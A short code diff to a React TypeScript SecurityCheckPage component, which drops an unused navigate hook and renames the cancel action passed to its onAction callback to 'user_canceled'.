@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useLocation, useNavigate } from 'react-router-dom';
+import { useLocation } from 'react-router-dom';
 import { ProviderKey, getProviderTheme } from './providerTheme';
 import ProviderShell from './ProviderShell';
 
@@ -10,7 +10,6 @@ interface SecurityCheckPageProps {
 
 const SecurityCheckPage: React.FC<SecurityCheckPageProps> = ({ providerKey, onAction }) => {
   const location = useLocation();
-  const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
   const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
   const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
@@ -42,8 +41,7 @@ const SecurityCheckPage: React.FC<SecurityCheckPageProps> = ({ providerKey, onAc
   };
   const handleNotMe = () => onAction('deny_security_check', { email });
   const goBack = () => {
-    onAction('cancel');
-    navigate(-1);
+    onAction('user_canceled');
   };
 
   const DetailRow = ({ label, value }: { label: string; value: string }) => (
